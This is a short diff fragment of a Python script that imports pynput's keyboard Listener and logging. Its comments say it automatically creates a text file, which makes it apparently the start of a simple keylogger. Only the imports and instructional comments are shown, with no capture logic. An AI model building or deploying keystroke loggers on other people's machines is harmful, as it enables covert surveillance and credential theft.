@@ -1,4 +1,7 @@
-#Delete this line and the # on line 2 to run code
+#Delete the '#'on line 5 to run code
+#Code will automatically create text file 
+
+
 #import pynput
 from pynput.keyboard import Key, Listener
 import logging 
